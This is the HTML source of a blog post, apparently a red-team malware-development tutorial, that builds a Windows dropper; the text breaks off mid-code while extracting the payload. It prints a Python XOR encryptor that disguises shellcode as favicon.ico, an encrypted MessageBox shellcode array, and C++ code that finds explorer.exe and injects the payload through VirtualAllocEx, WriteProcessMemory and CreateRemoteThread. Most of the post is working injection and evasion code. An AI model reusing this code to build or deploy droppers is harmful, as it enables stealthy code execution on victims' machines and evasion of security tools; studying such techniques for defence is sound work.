<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="MalDev Dropper Explorer.exe" /><meta name="author" content="Zeropio" /><meta property="og:locale" content="en" /><meta name="description" content="From a Dropper.exe, it will extract a shellcode from the .rsrc and inject it into the Explorer.exe. For this we will need: The C++ file A Resource Script file A C/C++ Header A Python script for XOR encryption A shellcode (in this case MessageBox)" /><meta property="og:description" content="From a Dropper.exe, it will extract a shellcode from the .rsrc and inject it into the Explorer.exe. For this we will need: The C++ file A Resource Script file A C/C++ Header A Python script for XOR encryption A shellcode (in this case MessageBox)" /><link rel="canonical" href="https://zeropio.ninja//malware/development/dropper-explorer-1" /><meta property="og:url" content="https://zeropio.ninja//malware/development/dropper-explorer-1" /><meta property="og:site_name" content="Zeropioâ€™s Dojo" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-02-01T00:00:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="MalDev Dropper Explorer.exe" /><meta name="twitter:site" content="@ZeropioWasTaken" /><meta name="twitter:creator" content="@ZeropioWasTaken" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Zeropio","url":"https://twitter.com/ZeropioWasTaken"},"dateModified":"2023-05-09T11:14:07+02:00","datePublished":"2023-02-01T00:00:00+01:00","description":"From a Dropper.exe, it will extract a shellcode from the .rsrc and inject it into the Explorer.exe. For this we will need: The C++ file A Resource Script file A C/C++ Header A Python script for XOR encryption A shellcode (in this case MessageBox)","headline":"MalDev Dropper Explorer.exe","mainEntityOfPage":{"@type":"WebPage","@id":"https://zeropio.ninja//malware/development/dropper-explorer-1"},"url":"https://zeropio.ninja//malware/development/dropper-explorer-1"}</script><title>MalDev | Dropper Explorer.exe | Zeropio's Dojo</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Zeropio's Dojo"><meta name="application-name" content="Zeropio's Dojo"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.2.1/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.1/dist/jquery.min.js"></script><body data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/icon.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/">Zeropio's Dojo</a></div><div class="site-subtitle font-italic">Cyberninja</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/zeropio" aria-label="github" target="_blank" rel="noopener noreferrer"> <i class="fab fa-github"></i> </a> <a href="https://ctftime.org/team/212175" aria-label="ctftime" target="_blank" rel="noopener noreferrer"> <i class="fas fa-flag"></i> </a> <a href="https://app.hackthebox.com/profile/380109" aria-label="hackthebox" target="_blank" rel="noopener noreferrer"> <i class="fas fa-cube"></i> </a> <a href="https://twitter.com/ZeropioWasTaken" aria-label="twitter" target="_blank" rel="noopener noreferrer"> <i class="fab fa-twitter"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>MalDev | Dropper Explorer.exe</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>MalDev | Dropper Explorer.exe</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1675206000" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Feb 1, 2023 </em> </span> <span> Updated <em class="" data-ts="1683623647" data-df="ll" data-toggle="tooltip" data-placement="bottom"> May 9, 2023 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/ZeropioWasTaken">Zeropio</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2127 words"> <em>11 min</em> read</span></div></div></div><div class="post-content"><p>From a <strong>Dropper.exe</strong>, it will extract a shellcode from the <code class="language-plaintext highlighter-rouge">.rsrc</code> and inject it into the <strong>Explorer.exe</strong>. For this we will need:</p><ul><li>The C++ file<li>A Resource Script file<li>A C/C++ Header<li>A Python script for XOR encryption<li>A shellcode (in this case <code class="language-plaintext highlighter-rouge">MessageBox</code>)</ul><h2 id="shellcode"><span class="mr-2">Shellcode</span><a href="#shellcode" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We already have a binary (<strong>msgbox64.bin</strong>) to use. With the following Python Script we can encrypt it:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre><span class="c1">## Red Team Operator course code template
## payload encryption with XOR
#
## author: reenz0h (twitter: @sektor7net)
</span>
<span class="kn">import</span> <span class="n">sys</span>

<span class="n">KEY</span> <span class="o">=</span> <span class="sh">"</span><span class="s">mysecretkeee</span><span class="sh">"</span>

<span class="k">def</span> <span class="nf">xor</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
	
	<span class="n">key</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
	<span class="n">l</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
	<span class="n">output_str</span> <span class="o">=</span> <span class="sh">""</span>

	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)):</span>
		<span class="n">current</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
		<span class="n">current_key</span> <span class="o">=</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nf">len</span><span class="p">(</span><span class="n">key</span><span class="p">)]</span>
		<span class="n">output_str</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="n">current</span><span class="p">)</span> <span class="o">^</span> <span class="nf">ord</span><span class="p">(</span><span class="n">current_key</span><span class="p">))</span>
	
	<span class="k">return</span> <span class="n">output_str</span>

<span class="k">def</span> <span class="nf">printCiphertext</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">):</span>
	<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">{ 0x</span><span class="sh">'</span> <span class="o">+</span> <span class="sh">'</span><span class="s">, 0x</span><span class="sh">'</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="n">x</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">ciphertext</span><span class="p">)</span> <span class="o">+</span> <span class="sh">'</span><span class="s"> };</span><span class="sh">'</span><span class="p">)</span>



<span class="k">try</span><span class="p">:</span>
    <span class="n">plaintext</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="sh">"</span><span class="s">rb</span><span class="sh">"</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span>
<span class="k">except</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">File argument needed! %s &lt;raw payload file&gt;</span><span class="sh">"</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>


<span class="n">ciphertext</span> <span class="o">=</span> <span class="nf">xor</span><span class="p">(</span><span class="n">plaintext</span><span class="p">,</span> <span class="n">KEY</span><span class="p">)</span>
<span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">favicon.ico</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">wb</span><span class="sh">"</span><span class="p">).</span><span class="nf">write</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">{ 0x</span><span class="sh">'</span> <span class="o">+</span> <span class="sh">'</span><span class="s">, 0x</span><span class="sh">'</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="n">x</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">ciphertext</span><span class="p">)</span> <span class="o">+</span> <span class="sh">'</span><span class="s"> };</span><span class="sh">'</span><span class="p">)</span>
</pre></table></code></div></div><p>We can get the shellcode with:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">C.\Users\Zeropio&gt;</span>C:<span class="se">\P</span>ython27<span class="se">\p</span>ython.exe xorencrypt.py msgbox64.bin
</pre></table></code></div></div><p>The shellcode will be:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>{ 0x91, 0x31, 0xf2, 0x81, 0x93, 0x8d, 0x9a, 0x8b, 0x83, 0xb5, 0x65, 0x65, 0x6d, 0x38, 0x22, 0x24, 0x33, 0x20, 0x34, 0x22, 0x23, 0x54, 0xb7, 0x0, 0x25, 0xf2, 0x21, 0x5, 0x5d, 0x3a, 0xee, 0x26, 0x73, 0x5b, 0x2d, 0xee, 0x3f, 0x59, 0x4d, 0x2d, 0xe8, 0x0, 0x35, 0x4a, 0x23, 0x6a, 0xd2, 0x2f, 0x27, 0x34, 0x42, 0xac, 0x2b, 0x43, 0xa5, 0xd8, 0x57, 0x4, 0x19, 0x67, 0x41, 0x59, 0x32, 0xa4, 0xaa, 0x7f, 0x24, 0x75, 0xaa, 0x87, 0x88, 0x37, 0x2c, 0x28, 0x4d, 0x2d, 0xe8, 0x20, 0x45, 0x4a, 0xe0, 0x27, 0x59, 0x2d, 0x6c, 0xa9, 0x4d, 0xee, 0xe3, 0xfa, 0x65, 0x74, 0x6b, 0x2d, 0xe0, 0xa5, 0x19, 0x16, 0x3b, 0x64, 0xb3, 0x22, 0x5b, 0xff, 0x23, 0x7d, 0x5b, 0x21, 0xe6, 0x39, 0x53, 0x2c, 0x62, 0xa2, 0x86, 0x28, 0x23, 0x9a, 0xac, 0x5b, 0x2c, 0xf2, 0x47, 0xed, 0x2b, 0x73, 0xb3, 0x39, 0x5a, 0xac, 0x2d, 0x54, 0xad, 0xd5, 0x32, 0xa4, 0xaa, 0x7f, 0x24, 0x75, 0xaa, 0x5d, 0x85, 0x10, 0x9c, 0x47, 0x3f, 0x66, 0x2f, 0x56, 0x6d, 0x31, 0x52, 0xb4, 0x10, 0xb3, 0x35, 0x47, 0x37, 0xee, 0x23, 0x56, 0x2c, 0x75, 0xbb, 0x3, 0x5b, 0x24, 0xe6, 0x75, 0x3b, 0x5b, 0x27, 0xf9, 0x25, 0x68, 0x22, 0x64, 0xb5, 0x5b, 0x2c, 0xf2, 0x77, 0xed, 0x2b, 0x73, 0xb5, 0x35, 0x33, 0x24, 0x3d, 0x3b, 0x34, 0x23, 0x32, 0x3d, 0x22, 0x2b, 0x24, 0x2e, 0x23, 0xe6, 0x89, 0x45, 0x2c, 0x2b, 0x8c, 0x85, 0x3b, 0x33, 0x3c, 0x2e, 0x55, 0x2d, 0xee, 0x77, 0x84, 0x30, 0x8c, 0x9a, 0x9c, 0x2f, 0x2c, 0xb3, 0xaa, 0x65, 0x65, 0x65, 0x6d, 0x47, 0x3b, 0xe8, 0xf6, 0x68, 0x64, 0x74, 0x6b, 0x5b, 0x29, 0xe8, 0xe8, 0x4c, 0x72, 0x65, 0x63, 0x3a, 0x54, 0xbd, 0x2a, 0xdf, 0x20, 0xe6, 0x3b, 0x7e, 0x8c, 0xb0, 0xd8, 0x92, 0x78, 0x5e, 0x61, 0x24, 0xdf, 0xc3, 0xf8, 0xc4, 0xee, 0x9a, 0xb6, 0x3a, 0xe6, 0xb0, 0x43, 0x59, 0x63, 0x19, 0x67, 0xf9, 0x88, 0x85, 0x16, 0x77, 0xde, 0x33, 0x78, 0x17, 0xa, 0xf, 0x6d, 0x20, 0x32, 0xec, 0xb9, 0x8d, 0xb0, 0x3c, 0x2, 0x45, 0x3, 0x17, 0x2, 0x14, 0x53, 0x37, 0x6, 0x16, 0x45, 0x20, 0xe, 0x4, 0x8, 0x45, 0x22, 0x9, 0x16, 0x17, 0x2, 0x6, 0xa, 0x6, 0x4a, 0x65, 0x37, 0x31, 0x22, 0x43, 0x53, 0x28, 0x2, 0x1e, 0x21, 0x11, 0x1d, 0x65 }
</pre></table></code></div></div><p>As we want to extract the shellcode from <code class="language-plaintext highlighter-rouge">.rsrc</code>, we need to extract it from a resource, not the payload directly. Because of this we added the line:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">favicon.ico</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">wb</span><span class="sh">"</span><span class="p">).</span><span class="nf">write</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span>
</pre></table></code></div></div><p>That will generate our <strong>favicon.ico</strong>.</p><hr /><h2 id="exe"><span class="mr-2">EXE</span><a href="#exe" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="functions"><span class="mr-2">Functions</span><a href="#functions" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We will import all the functions we need:</p><ul><li><code class="language-plaintext highlighter-rouge">XOR</code>: for decryption<li><code class="language-plaintext highlighter-rouge">FindTarget</code>: for finding the explorer PID<li><code class="language-plaintext highlighter-rouge">Inject</code>: for inject into the process</ul><div class="language-cpp highlighter-rouge"><div class="code-header"> <span data-label-text="Cpp"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;tlhelp32.h&gt;</span><span class="cp">
#include</span> <span class="cpf">"resources.h"</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">XOR</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">data_len</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">key_len</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">int</span> <span class="n">j</span><span class="p">;</span>
	
	<span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">data_len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">j</span> <span class="o">==</span> <span class="n">key_len</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

		<span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
		<span class="n">j</span><span class="o">++</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">FindTarget</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">procname</span><span class="p">)</span> <span class="p">{</span>

        <span class="n">HANDLE</span> <span class="n">hProcSnap</span><span class="p">;</span>
        <span class="n">PROCESSENTRY32</span> <span class="n">pe32</span><span class="p">;</span>
        <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                
        <span class="n">hProcSnap</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">INVALID_HANDLE_VALUE</span> <span class="o">==</span> <span class="n">hProcSnap</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
                
        <span class="n">pe32</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESSENTRY32</span><span class="p">);</span> 
                
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">Process32First</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">))</span> <span class="p">{</span>
                <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">);</span>
                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
                
        <span class="k">while</span> <span class="p">(</span><span class="n">Process32Next</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">))</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">lstrcmpiA</span><span class="p">(</span><span class="n">procname</span><span class="p">,</span> <span class="n">pe32</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                        <span class="n">pid</span> <span class="o">=</span> <span class="n">pe32</span><span class="p">.</span><span class="n">th32ProcessID</span><span class="p">;</span>
                        <span class="k">break</span><span class="p">;</span>
                <span class="p">}</span>
        <span class="p">}</span>
                
        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">);</span>
                
        <span class="k">return</span> <span class="n">pid</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="nf">Inject</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hProc</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">payload</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span><span class="p">)</span> <span class="p">{</span>

        <span class="n">LPVOID</span> <span class="n">pRemoteCode</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
        <span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

  
        <span class="n">pRemoteCode</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">);</span>
        <span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="n">pRemoteCode</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="n">payload</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">payload_len</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span> <span class="o">*</span><span class="p">)</span><span class="nb">NULL</span><span class="p">);</span>
        
        <span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateRemoteThread</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">pRemoteCode</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">hThread</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="mi">500</span><span class="p">);</span>
                <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hThread</span><span class="p">);</span>
                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><h3 id="gui-trick"><span class="mr-2">GUI Trick</span><a href="#gui-trick" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Now, instead of a <code class="language-plaintext highlighter-rouge">main</code> function we will use a <code class="language-plaintext highlighter-rouge">WinMain</code> function. Declare all the variables:</p><div class="language-cpp highlighter-rouge"><div class="code-header"> <span data-label-text="Cpp"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="kt">int</span> <span class="n">WINAPI</span> <span class="nf">WinMain</span><span class="p">(</span><span class="n">HINSTANCE</span> <span class="n">hInstance</span><span class="p">,</span> <span class="n">HINSTANCE</span> <span class="n">hPrevInstance</span><span class="p">,</span> 
    <span class="n">LPSTR</span> <span class="n">lpCmdLine</span><span class="p">,</span> <span class="kt">int</span> <span class="n">nCmdShow</span><span class="p">)</span> <span class="p">{</span>
    
	<span class="kt">void</span> <span class="o">*</span> <span class="n">exec_mem</span><span class="p">;</span>
	<span class="n">BOOL</span> <span class="n">rv</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">th</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">oldprotect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">HGLOBAL</span> <span class="n">resHandle</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">HRSRC</span> <span class="n">res</span><span class="p">;</span>
	
	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">payload</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span><span class="p">;</span>
	
	<span class="kt">char</span> <span class="n">key</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"mysecretkeee"</span><span class="p">;</span>
	
	<span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">HANDLE</span> <span class="n">hProc</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</pre></table></code></div></div><h3 id="payload"><span class="mr-2">Payload</span><a href="#payload" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Extract the payload from the resources. We will need:</p><ul><li><strong>resources.h</strong></ul><div class="language-cpp highlighter-rouge"><div class="code-header"> <span data-label-text="Cpp"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="cp">#define FAVICON_ICO 100
</span></pre></table></code></div></div><ul><li><strong>resources.rc</strong></ul><div class="language-cpp highlighter-rouge"><div class="code-header"> <span data-label-text="Cpp"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">"resources.h"</span><span class="cp">
</span>
<span class="n">FAVICON_ICO</span> <span class="n">RCDATA</span> <span class="n">favicon</span><span class="p">.</span><span class="n">ico</span>
</pre></table></code></div></div><ul><li><strong>favicon.ico</strong> generated with Python</ul><p>Now, get the payload in the main file:</p><div class="language-cpp highlighter-rouge"><div class="code-header"> <span data-label-text="Cpp"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>	<span class="c1">// Extract payload from resources section</span>
